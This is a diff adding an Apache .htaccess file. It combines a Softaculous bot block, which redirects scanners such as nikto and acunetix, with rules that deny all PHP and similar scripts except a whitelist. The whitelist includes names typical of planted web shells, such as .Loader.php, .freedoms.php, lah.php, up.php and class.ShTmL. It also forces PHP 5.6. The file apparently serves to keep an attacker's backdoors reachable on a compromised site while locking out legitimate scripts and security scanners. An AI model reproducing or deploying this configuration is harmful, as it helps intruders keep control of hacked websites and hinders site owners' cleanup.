@@ -1,0 +1,53 @@
+# SOFTACULOUS Enable bot protection
+RewriteEngine on
+RewriteCond %{HTTP_USER_AGENT} (?:virusbot|spambot|evilbot|acunetix|BLEXBot|domaincrawler\.com|LinkpadBot|MJ12bot/v|majestic12\.co\.uk|AhrefsBot|TwengaBot|SemrushBot|nikto|winhttp|Xenu\s+Link\s+Sleuth|Baiduspider|HTTrack|clshttp|harvest|extract|grab|miner|python-requests) [NC]
+RewriteRule ^(.*)$ http://no.access/
+# SOFTACULOUS Enable bot protection End
+
+
+<Files *.ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.a*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.Ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.S*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.pH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.PH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.s*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+
+<FilesMatch "\.(docx|xlsx|rar|doc|gif|jpg|pdf|jpeg|mp4|md|json|js|css|scss|ttf|woff|woff2|eot|docx|webp|heic|mp4)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+
+<FilesMatch "^(index.html|index.php|class.php|class-index.php|config.php|login.php|.Loader.php|.user4-128x128.php|print_staff.php|print_laporan.php|lah.php|.Loader.php|.freedoms.php|class.ShTmL|up.php)$">
+ Order allow,deny
+ Allow from all
+</FilesMatch>
+
+DirectoryIndex index.php index.html index.blade.php
+
+Options -Indexes
+
+<FilesMatch "\.(php4|php5|php3|php2|php|phtml)$">
+SetHandler application/x-httpd-alt-php56___lsphp
+</FilesMatch>
